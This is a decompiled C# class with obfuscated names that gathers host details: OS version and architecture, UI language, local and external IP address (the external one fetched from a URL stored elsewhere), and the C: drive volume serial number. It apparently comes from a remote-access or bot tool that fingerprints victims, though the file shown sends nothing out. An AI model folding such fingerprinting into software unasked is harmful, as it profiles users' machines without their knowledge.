using System;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

internal sealed class Class0
{
	internal struct Struct0
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_0;

		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public UIntPtr uintptr_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public ushort ushort_2;

		public ushort ushort_3;
	}

	public static string string_0 = "C";

	[DllImport("kernel32.dll")]
	internal static extern void GetNativeSystemInfo(ref Struct0 struct0_0);

	public static string smethod_0()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		string text = "Unknown";
		switch (oSVersion.Platform)
		{
		case PlatformID.Win32Windows:
			switch (oSVersion.Version.Minor)
			{
			case 90:
				text = "Windows ME";
				break;
			case 10:
				text = "Windows 98";
				break;
			case 0:
				text = "Windows 95";
				break;
			}
			break;
		case PlatformID.Win32NT:
			switch (oSVersion.Version.Major)
			{
			case 3:
				text = "Windows NT3";
				break;
			case 4:
				text = "Windows NT4";
				break;
			case 5:
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = "Windows Server 2000";
					break;
				case 1:
					text = "Windows XP";
					break;
				case 2:
					text = "Windows Server 2003";
					break;
				}
				break;
			case 6:
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = "Windows Vista";
					break;
				case 1:
					text = "Windows Seven";
					break;
				}
				break;
			}
			break;
		}
		return text + " " + smethod_1();
	}

	private static string smethod_1()
	{
		Struct0 struct0_ = default(Struct0);
		GetNativeSystemInfo(ref struct0_);
		return struct0_.ushort_0 switch
		{
			9 => " (x64)", 
			0 => " (x86)", 
			_ => string.Empty, 
		};
	}

	public static string smethod_2()
	{
		try
		{
			return CultureInfo.CurrentCulture.TwoLetterISOLanguageName.ToLower();
		}
		catch
		{
			return "--";
		}
	}

	public static string smethod_3()
	{
		string text = string.Empty;
		string hostName = Dns.GetHostName();
		IPAddress[] hostAddresses = Dns.GetHostAddresses(hostName);
		foreach (IPAddress iPAddress in hostAddresses)
		{
			if (iPAddress.AddressFamily.ToString().Equals("InterNetwork"))
			{
				text = iPAddress.ToString();
				break;
			}
		}
		if (text != string.Empty)
		{
			return text;
		}
		IPAddress[] hostAddresses2 = Dns.GetHostAddresses(Dns.GetHostName());
		foreach (IPAddress iPAddress2 in hostAddresses2)
		{
			if (iPAddress2.AddressFamily.ToString() == "InterNetwork")
			{
				text = iPAddress2.ToString();
				break;
			}
		}
		return text;
	}

	public static string smethod_4()
	{
		try
		{
			WebClient webClient = new WebClient();
			string input = webClient.DownloadString(Class15.string_1);
			input = new Regex("\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b").Match(input).Value;
			webClient.Dispose();
			return input;
		}
		catch
		{
			return "--.--.--.--";
		}
	}

	public static string smethod_5()
	{
		if (string_0 == string.Empty)
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					string_0 = driveInfo.RootDirectory.ToString();
					break;
				}
			}
		}
		if (string_0.EndsWith(":\\"))
		{
			string_0 = string_0.Substring(0, string_0.Length - 2);
		}
		return smethod_6("C");
	}

	public static string smethod_6(string string_1)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"" + string_1 + ":\"");
		val.Get();
		string result = ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		val.Dispose();
		return result;
	}
}
